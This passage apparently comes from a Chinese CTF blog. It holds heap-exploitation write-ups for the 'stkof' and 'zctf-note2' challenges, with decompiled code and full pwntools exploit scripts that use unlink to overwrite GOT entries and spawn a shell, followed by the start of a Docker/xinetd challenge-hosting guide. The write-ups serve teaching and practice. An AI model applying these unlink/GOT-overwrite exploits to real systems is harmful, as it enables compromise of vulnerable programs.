class="line">strcpy(data, &quot;Victim&apos;s data&quot;);</span><br><span class="line"></span><br><span class="line">// Overwrite victim&apos;s data using chunk1</span><br><span class="line">chunk1[0] = 0x002164656b636168LL;   // hex for &quot;hacked!&quot;</span><br><span class="line"></span><br><span class="line">printf(&quot;%s\n&quot;, data);         // Prints &quot;hacked!&quot;</span><br></pre></td></tr></table></figure><h1 id="stkof"><a href="#stkof" class="headerlink" title="stkof"></a>stkof</h1><h2 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h2><p>选项1：malloc_chunk</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">signed __int64 malloc_chunk()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 size; // [rsp+0h] [rbp-80h]</span><br><span class="line">  char *v2; // [rsp+8h] [rbp-78h]</span><br><span class="line">  char s; // [rsp+10h] [rbp-70h]</span><br><span class="line">  unsigned __int64 v4; // [rsp+78h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(0x28u);</span><br><span class="line">  fgets(&amp;s, 16, stdin);</span><br><span class="line">  size = atoll(&amp;s);</span><br><span class="line">  v2 = (char *)malloc(size);</span><br><span class="line">  if ( !v2 )</span><br><span class="line">    return 0xFFFFFFFFLL;</span><br><span class="line">  ::s[++index] = v2;                            // ::全局</span><br><span class="line">  printf(&quot;%d\n&quot;, (unsigned int)index, size);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>选项二：edit_chunk           //完全没考虑之前malloc时的大小，直接溢出就对了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">signed __int64 edit_chunk()</span><br><span class="line">&#123;</span><br><span class="line">  signed __int64 result; // rax</span><br><span class="line">  int i; // eax</span><br><span class="line">  unsigned int index; // [rsp+8h] [rbp-88h]</span><br><span class="line">  __int64 size; // [rsp+10h] [rbp-80h]</span><br><span class="line">  char *ptr; // [rsp+18h] [rbp-78h]</span><br><span class="line">  char s; // [rsp+20h] [rbp-70h]</span><br><span class="line">  unsigned __int64 v6; // [rsp+88h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(0x28u);</span><br><span class="line">  fgets(&amp;s, 16, stdin);</span><br><span class="line">  index = atol(&amp;s);</span><br><span class="line">  if ( index &gt; 0x100000 )</span><br><span class="line">    return 0xFFFFFFFFLL;</span><br><span class="line">  if ( !::s[index] )</span><br><span class="line">    return 0xFFFFFFFFLL;</span><br><span class="line">  fgets(&amp;s, 16, stdin);</span><br><span class="line">  size = atoll(&amp;s);</span><br><span class="line">  ptr = ::s[index];</span><br><span class="line">  for ( i = fread(ptr, 1uLL, size, stdin); i &gt; 0; i = fread(ptr, 1uLL, size, stdin) )</span><br><span class="line">  &#123;</span><br><span class="line">    ptr += i;</span><br><span class="line">    size -= i;</span><br><span class="line">  &#125;</span><br><span class="line">  if ( size )</span><br><span class="line">    result = 0xFFFFFFFFLL;</span><br><span class="line">  else</span><br><span class="line">    result = 0LL;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>选项三：free_chunk</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">signed __int64 free_chunk()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v1; // [rsp+Ch] [rbp-74h]</span><br><span class="line">  char s; // [rsp+10h] [rbp-70h]</span><br><span class="line">  unsigned __int64 v3; // [rsp+78h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(0x28u);</span><br><span class="line">  fgets(&amp;s, 16, stdin);</span><br><span class="line">  v1 = atol(&amp;s);</span><br><span class="line">  if ( v1 &gt; 0x100000 )</span><br><span class="line">    return 0xFFFFFFFFLL;</span><br><span class="line">  if ( !::s[v1] )</span><br><span class="line">    return 0xFFFFFFFFLL;</span><br><span class="line">  free(::s[v1]);</span><br><span class="line">  ::s[v1] = 0LL;                                // free and make it be 0</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>基本上没什么分析的。。。漏洞很明显，就是在告诉你来unlink。</p><p>思路就是malloc几个smallbin大小的chunk，之后伪造fakechunk unlink，<br>之后edit被伪造的fakechunk的chunk，修改free，atoi的got表，调用system(“/bin/sh”)获得shell<br>1.利用unlink修改修改GOT表。<br>2.泄露libc基址。<br>3.将free_got改成system_addr.<br>4.free一个内存块，其中的内容是”/bin/sh”。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.terminal = [&apos;gnome-terminal&apos;, &apos;-x&apos;, &apos;sh&apos;, &apos;-c&apos;]</span><br><span class="line">if args[&apos;DEBUG&apos;]:</span><br><span class="line">    context.log_level = &apos;debug&apos;</span><br><span class="line">context.binary = &quot;./stkof&quot;</span><br><span class="line">stkof = ELF(&apos;./stkof&apos;)</span><br><span class="line">if args[&apos;REMOTE&apos;]:</span><br><span class="line">    p = remote(&apos;127.0.0.1&apos;, 7777)</span><br><span class="line">else:</span><br><span class="line">    p = process(&quot;./stkof&quot;)</span><br><span class="line">log.info(&apos;PID: &apos; + str(proc.pidof(p)[0]))</span><br><span class="line">libc = ELF(&apos;./libc.so.6&apos;)</span><br><span class="line">head = 0x602140                              //ida可以直接看，全局分配在了bss段</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def alloc(size):</span><br><span class="line">    p.sendline(&apos;1&apos;)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(&apos;OK\n&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def edit(idx, size, content):</span><br><span class="line">    p.sendline(&apos;2&apos;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.send(content)</span><br><span class="line">    p.recvuntil(&apos;OK\n&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def free(idx):</span><br><span class="line">    p.sendline(&apos;3&apos;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">    # trigger to malloc buffer for io function</span><br><span class="line">    alloc(0x100)  # idx 1</span><br><span class="line"></span><br><span class="line">    alloc(0x30)  # idx 2</span><br><span class="line">    # small chunk size inorder to trigger unlink</span><br><span class="line">    alloc(0x80)  # idx 3</span><br><span class="line">    # a fake chunk at global[2]=head+16 who&apos;s size is 0x20</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/6gx 0x602140</span><br><span class="line">0x602140:0x00000000000000000x000000000244d020</span><br><span class="line">0x602150:0x000000000244d5400x000000000244d580</span><br><span class="line">0x602160:0x00000000000000000x0000000000000000</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/100gx 0x000000000244d530</span><br><span class="line">0x244d530:0x00000000000000000x0000000000000041</span><br><span class="line">0x244d540:0x00000000000000000x0000000000000000</span><br><span class="line">0x244d550:0x00000000000000000x0000000000000000</span><br><span class="line">0x244d560:0x00000000000000000x0000000000000000</span><br><span class="line">0x244d570:0x00000000000000000x0000000000000091</span><br><span class="line">0x244d580:0x00000000000000000x0000000000000000</span><br><span class="line">0x244d590:0x00000000000000000x0000000000000000</span><br><span class="line">0x244d5a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x244d5b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x244d5c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x244d5d0:0x00000000000000000x0000000000000000</span><br><span class="line">0x244d5e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x244d5f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x244d600:0x00000000000000000x0000000000020a01</span><br><span class="line">0x244d610:0x00000000000000000x0000000000000000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    payload = p64(0)  #prev_size</span><br><span class="line">    payload += p64(0x20)  #size</span><br><span class="line">    payload += p64(head + 16 - 0x18)  #fd</span><br><span class="line">    payload += p64(head + 16 - 0x10)  #bk</span><br><span class="line">    payload += p64(0x20)  # next chunk&apos;s prev_size bypass the check</span><br><span class="line">    payload = payload.ljust(0x30, &apos;a&apos;)</span><br><span class="line">    # overwrite global[3]&apos;s chunk&apos;s prev_size</span><br><span class="line">    # make it believe that prev chunk is at global[2]</span><br><span class="line">    payload += p64(0x30)</span><br><span class="line">    # make it believe that prev chunk is free</span><br><span class="line">    payload += p64(0x90)</span><br><span class="line">    edit(2, len(payload), payload)</span><br><span class="line">    # unlink fake chunk, so global[2] =&amp;(global[2])-0x18=head-8</span><br><span class="line">    free(3)</span><br><span class="line">    p.recvuntil(&apos;OK\n&apos;)</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/6gx 0x602140</span><br><span class="line">0x602140:0x00000000000000000x000000000244d020</span><br><span class="line">0x602150:0x00000000006021380x0000000000000000</span><br><span class="line">0x602160:0x00000000000000000x0000000000000000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    # overwrite global[0] = free@got, global[1]=puts@got, global[2]=atoi@got</span><br><span class="line">    payload = &apos;a&apos; * 8 + p64(stkof.got[&apos;free&apos;]) + p64(stkof.got[&apos;puts&apos;]) + p64(</span><br><span class="line">        stkof.got[&apos;atoi&apos;])</span><br><span class="line">    edit(2, len(payload), payload)</span><br><span class="line">    # edit free@got to puts@plt</span><br><span class="line">    payload = p64(stkof.plt[&apos;puts&apos;])</span><br><span class="line">    edit(0, len(payload), payload)</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/6gx 0x602130</span><br><span class="line">0x602130:0x00000000000000000x6161616161616161</span><br><span class="line">0x602140:0x0000000000602018  //free0x0000000000602020  //puts</span><br><span class="line">0x602150:0x0000000000602088  //atoi0x0000000000000000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    #free global[1] to leak puts addr</span><br><span class="line">    free(1)</span><br><span class="line">    puts_addr = p.recvuntil(&apos;\nOK\n&apos;, drop=True).ljust(8, &apos;\x00&apos;)</span><br><span class="line">    puts_addr = u64(puts_addr)</span><br><span class="line">    log.success(&apos;puts addr: &apos; + hex(puts_addr))</span><br><span class="line">    libc_base = puts_addr - libc.symbols[&apos;puts&apos;]</span><br><span class="line">    binsh_addr = libc_base + next(libc.search(&apos;/bin/sh&apos;))</span><br><span class="line">    system_addr = libc_base + libc.symbols[&apos;system&apos;]</span><br><span class="line">    log.success(&apos;libc base: &apos; + hex(libc_base))</span><br><span class="line">    log.success(&apos;/bin/sh addr: &apos; + hex(binsh_addr))</span><br><span class="line">    log.success(&apos;system addr: &apos; + hex(system_addr))</span><br><span class="line">    # modify atoi@got to system addr</span><br><span class="line">    payload = p64(system_addr)</span><br><span class="line">    edit(2, len(payload), payload)</span><br><span class="line">    p.send(p64(binsh_addr))</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure><h1 id="zctf-note2"><a href="#zctf-note2" class="headerlink" title="zctf-note2"></a>zctf-note2</h1><p>其实和stkof差不太多</p><h2 id="条件-1"><a href="#条件-1" class="headerlink" title="条件"></a>条件</h2><ol><li>创建 //最多只能有三个note，同时note大小最大128</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">int NewNote()</span><br><span class="line">&#123;</span><br><span class="line">  char *note; // ST08_8</span><br><span class="line">  unsigned int v2; // eax</span><br><span class="line">  unsigned int size; // [rsp+4h] [rbp-Ch]</span><br><span class="line"></span><br><span class="line">  if ( (unsigned int)NoteNum &gt; 3 )</span><br><span class="line">    return puts(&quot;note lists are full&quot;);</span><br><span class="line">  puts(&quot;Input the length of the note content:(less than 128)&quot;);</span><br><span class="line">  size = inputNum();</span><br><span class="line">  if ( size &gt; 0x80 )</span><br><span class="line">    return puts(&quot;Too long&quot;);</span><br><span class="line">  note = (char *)malloc(size);</span><br><span class="line">  puts(&quot;Input the note content:&quot;);</span><br><span class="line">  ReadStr(note, size, 10);</span><br><span class="line">  RemovePercent(note);</span><br><span class="line">  ptr[NoteNum] = (__int64)note;</span><br><span class="line">  Len[NoteNum] = size;</span><br><span class="line">  v2 = NoteNum++;</span><br><span class="line">  return printf(&quot;note add success, the id is %d\n&quot;, v2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>修改  //两种方式，overwrite与append</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">puts(&quot;do you want to overwrite or append?[1.overwrite/2.append]&quot;);</span><br><span class="line">        v4 = inputNum();</span><br><span class="line">        if ( v4 == 1 || v4 == 2 )</span><br><span class="line">        &#123;</span><br><span class="line">          if ( v4 == 1 )</span><br><span class="line">            dest = 0;</span><br><span class="line">          else</span><br><span class="line">            strcpy(&amp;dest, src);</span><br><span class="line">          v0 = (char *)malloc(0xA0uLL);</span><br><span class="line">          v8 = v0;</span><br><span class="line">          *(_QWORD *)v0 = &apos;oCweNehT&apos;;</span><br><span class="line">          *((_QWORD *)v0 + 1) = &apos;:stnetn&apos;;</span><br><span class="line">          printf(v8);</span><br><span class="line">          ReadStr(v8 + 15, 0x90LL, 10);</span><br><span class="line">          RemovePercent(v8 + 15);</span><br><span class="line">          v1 = v8;</span><br><span class="line">          v1[v6 - strlen(&amp;dest) + 14] = 0;</span><br><span class="line">          strncat(&amp;dest, v8 + 15, 0xFFFFFFFFFFFFFFFFLL);</span><br><span class="line">          strcpy(src, &amp;dest);</span><br><span class="line">          free(v8);</span><br><span class="line">          puts(&quot;Edit note success!&quot;);</span><br></pre></td></tr></table></figure><p>还有show的功能和delete的功能，这里就不展示了</p><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>相比于stkof显而易见的漏洞，这个因为edit的操作较为复杂，漏洞没有那么容易出来，但是如果出来便可以直接利用。<br>在malloc时，可以输入size为0，这样将自动分配最小单位即0x20大小的chunk，但是在readstr时允许输入size-1大小的数，也就是0xffffffff，这样便足以溢出去修改。<br>free之后再申请同样大小的chunk，便会将其列入第四个chunk但是位置仍然在之前chunk1的位置，通过之前size的漏洞修改chunk3的pre_size及size得到unlink的条件。</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(&apos;./note2&apos;)</span><br><span class="line">note2 = ELF(&apos;./note2&apos;)</span><br><span class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def newnote(length, content):</span><br><span class="line">    sh.recvuntil(&apos;option---&gt;&gt;&apos;)</span><br><span class="line">    sh.sendline(&apos;1&apos;)</span><br><span class="line">    sh.recvuntil(&apos;(less than 128)&apos;)</span><br><span class="line">    sh.sendline(str(length))</span><br><span class="line">    sh.recvuntil(&apos;content:&apos;)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def shownote(id):</span><br><span class="line">    sh.recvuntil(&apos;option---&gt;&gt;&apos;)</span><br><span class="line">    sh.sendline(&apos;2&apos;)</span><br><span class="line">    sh.recvuntil(&apos;note:&apos;)</span><br><span class="line">    sh.sendline(str(id))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def editnote(id, choice, s):</span><br><span class="line">    sh.recvuntil(&apos;option---&gt;&gt;&apos;)</span><br><span class="line">    sh.sendline(&apos;3&apos;)</span><br><span class="line">    sh.recvuntil(&apos;note:&apos;)</span><br><span class="line">    sh.sendline(str(id))</span><br><span class="line">    sh.recvuntil(&apos;2.append]&apos;)</span><br><span class="line">    sh.sendline(str(choice))</span><br><span class="line">    sh.sendline(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def deletenote(id):</span><br><span class="line">    sh.recvuntil(&apos;option---&gt;&gt;&apos;)</span><br><span class="line">    sh.sendline(&apos;4&apos;)</span><br><span class="line">    sh.recvuntil(&apos;note:&apos;)</span><br><span class="line">    sh.sendline(str(id))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.recvuntil(&apos;name:&apos;)</span><br><span class="line">sh.sendline(&apos;siriuswhiter&apos;)</span><br><span class="line">sh.recvuntil(&apos;address:&apos;)</span><br><span class="line">sh.sendline(&apos;aaaaaaaaaaaaaaaaa&apos;)</span><br><span class="line"></span><br><span class="line"># chunk0: a fake chunk</span><br><span class="line">ptr = 0x0000000000602120</span><br><span class="line">fakefd = ptr - 0x18</span><br><span class="line">fakebk = ptr - 0x10</span><br><span class="line">content = &apos;a&apos; * 8 + p64(0x61) + p64(fakefd) + p64(fakebk) + &apos;b&apos; * 64 + p64(0x60)</span><br><span class="line">#content = p64(fakefd) + p64(fakebk)</span><br><span class="line">newnote(128, content)</span><br><span class="line"># chunk1: a zero size chunk produce overwrite</span><br><span class="line">newnote(0, &apos;a&apos; * 8)</span><br><span class="line"># chunk2: a chunk to be overwrited and freed</span><br><span class="line">newnote(0x80, &apos;b&apos; * 16)</span><br><span class="line"></span><br><span class="line">gdb.attach(sh)</span><br><span class="line"># edit the chunk1 to overwrite the chunk2</span><br><span class="line">deletenote(1)</span><br><span class="line">content = &apos;a&apos; * 16 + p64(0xa0) + p64(0x90)</span><br><span class="line">newnote(0, content)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"># delete note 2 to trigger the unlink</span><br><span class="line"># after unlink, ptr[0] = ptr - 0x18</span><br><span class="line">deletenote(2)</span><br><span class="line">gdb.attach(sh)</span><br><span class="line"># overwrite the chunk0(which is ptr[0]) with got atoi</span><br><span class="line">atoi_got = note2.got[&apos;atoi&apos;]</span><br><span class="line">content = &apos;a&apos; * 0x18 + p64(atoi_got)</span><br><span class="line">editnote(0, 1, content)</span><br><span class="line"># get the aoti addr</span><br><span class="line">shownote(0)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&apos;is &apos;)</span><br><span class="line">atoi_addr = sh.recvuntil(&apos;\n&apos;, drop=True)</span><br><span class="line">print atoi_addr</span><br><span class="line">atoi_addr = u64(atoi_addr.ljust(8, &apos;\x00&apos;))</span><br><span class="line">print &apos;leak atoi addr: &apos; + hex(atoi_addr)</span><br><span class="line"></span><br><span class="line"># get system addr</span><br><span class="line">atoi_offest = libc.symbols[&apos;atoi&apos;]</span><br><span class="line">libcbase = atoi_addr - atoi_offest</span><br><span class="line">system_offest = libc.symbols[&apos;system&apos;]</span><br><span class="line">system_addr = libcbase + system_offest</span><br><span class="line"></span><br><span class="line">print &apos;leak system addr: &apos;, hex(system_addr)</span><br><span class="line"></span><br><span class="line"># overwrite the atoi got with systemaddr</span><br><span class="line">content = p64(system_addr)</span><br><span class="line">editnote(0, 1, content)</span><br><span class="line">gdb.attach(sh)</span><br><span class="line"># get shell</span><br><span class="line">sh.recvuntil(&apos;option---&gt;&gt;&apos;)</span><br><span class="line">sh.sendline(&apos;/bin/sh&apos;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Learning Docker</title>
      <link href="/2018/11/10/learning-docker/"/>
      <url>/2018/11/10/learning-docker/</url>
      <content type="html"><![CDATA[<p><em>之前是为了学习搭pwn题的环境稍微碰了下docker，但是因为kali上的gdb被我搞得问题很大，再加上不能完全卸载重装，索性想着搞一个pwn工具的集成环境，一劳永逸，docker无疑是个好东西，顺便也记录下搭建pwn题的过程吧</em></p><h1 id="pwn环境部署"><a href="#pwn环境部署" class="headerlink" title="pwn环境部署"></a>pwn环境部署</h1><p>  最基础的方法是socat， <code>socat tcp-l:9999,fork exec:./pwn1</code><br>  没有timeout，连得人多多半就爆炸了</p><p>所以选择：<br><code>xinted + docker</code></p><h2 id="xinted"><a href="#xinted" class="headerlink" title="xinted"></a>xinted</h2><p><a href="https://github.com/Eadom/ctf_xinetd" target="_blank" rel="noopener">xinted</a>从权限到服务配置都做好了一个dockerfile,build即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Eadom/ctf_xinetd.git</span><br></pre></td></tr></table></figure><h2 id="docker-安装"><a href="#docker-安装" class="headerlink" title="docker 安装"></a>docker 安装</h2><p> 因为没有用ubuntu，kali等其他的debian系等等没法直接 <code>sudo apt-get install docker-ce</code></p><p>kali最后成功安装docker的方法：</p><p>在/etc/apt/sources.list 中添加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">deb http://http.debian.net/debian jessie-backports main</span><br></pre></td></tr></table></figure><p>更新源并安装即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get update   </span><br><span class="line">apt-get install docker.io</span><br></pre></td></tr></table></figure><h2 id="配置docker环境"><a href="#配置docker环境" class="headerlink" title="配置docker环境"></a>配置docker环境</h2><ul><li>将bin文件放置到bin目录下</li><li>修改flag内容</li><li>修改ctf.xinted的服务：<br>port = 指定端口<br>server_args = –userspec=1000:1000 /home/ctf ./binname</li></ul><h2 id="build-dockerfile"><a href="#build-dockerfile" class="headerlink" title="build dockerfile"></a>build dockerfile</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker build -t &quot;binname&quot; . </span><br><span class="line">docker run -d -p &quot;0.0.0.0:9999:9999&quot; -h &quot;biname&quot; --name=&quot;binname&quot; binname</span><br></pre></td></tr></table></figure><p>将镜像跑起来就ok了</p><h1 id="pwn-docker"><a href="#pwn-docker" class="headerlink" title="pwn docker"></a>pwn 